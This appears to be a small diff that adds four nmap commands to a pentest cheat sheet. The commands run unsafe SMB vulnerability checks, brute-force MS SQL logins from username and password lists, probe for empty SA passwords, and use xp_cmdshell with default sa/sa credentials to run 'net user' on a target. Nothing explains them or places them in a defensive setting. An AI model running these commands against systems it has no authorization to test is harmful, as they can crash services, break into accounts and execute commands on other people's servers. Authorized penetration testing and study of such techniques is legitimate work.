@@ -1,0 +1,4 @@
+nmap --script smb-check-vulns --script-args unsafe=1
+nmap -p 1433 --script ms-sql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt
+nmap -p 1433 --script ms-sql-empty-password
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user"
